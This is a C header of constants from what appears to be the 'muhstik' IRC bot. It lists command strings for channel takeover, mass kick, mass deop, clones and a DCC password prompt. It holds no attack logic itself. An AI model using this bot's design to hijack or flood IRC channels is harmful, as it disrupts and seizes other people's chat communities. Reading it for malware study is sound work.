#ifndef GLOBAL_H
#define GLOBAL_H

#define VERSION "4.2.2"

/* List lengths */

#define MAX_AOPS 128
#define MAX_PROTS 128
#define MAX_SHITS 128
#define MAX_CHANS 64
#define MAX_NICKS 1024
#define MAX_IDENTS 1024
#define MAX_NAMES 1024
#define MAX_GROUPS 16
#define MAX_CLONES 1024
#define MAX_BROTHERS 1024
#define MAX_LINKS 128
#define MAX_DCCS 128
#define MAX_MUTEX 2

/* Internal commands */

#define ADDOP "+aop"
#define RMOP "-aop"
#define ADDPROT "+prot"
#define RMPROT "-prot"
#define ADDSHIT "+shit"
#define RMSHIT "-shit"
#define ADDSCAN "+scan"
#define RMSCAN "-scan"
#define KICKBAN "kb"
#define MASSKICK "mk"
#define MASSKICKBAN "mkb"
#define TAKEOVER "to"
#define MASSOP "mo"
#define MASSDEOP "md"
#define MASSUNBAN "mu"
#define NICKS "nicks"
#define NICKLIST "nicklist"
#define ECHO "echo"
#define BROADCAST "broadcast"
#define CHANKEY "chankey"
#define STATUS "stat"
#define MUTE "mute"
#define PEACE "peace"
#define AGGRESS "agg"
#define RANDOM "random"
#define PASSWD "passwd"
#define KILL "kill"
#define SELECT "select"
#define LOAD "load"

/* Messages */

#define KICK_REAS "muhstik powa"
#define SHIT_REAS "shit listed"
#define SETON "activated"
#define CLOSE "+iml 1"
#define DCC1 "muhstik %s\npassword ?\n"
#define DCC2 "Wrong password...\n"

/* Buffer sizes */

#define MINIBUF 32
#define MINIBUF_TXT "32"
#define MEDBUF 128
#define MEDBUF_TXT "128"
#define BIGBUF 1024
#define BIGBUF_TXT "1024"

/* To avoid mixing sleep() and usleep() */
#define sleep(t)\
usleep (t*1000000)

#endif
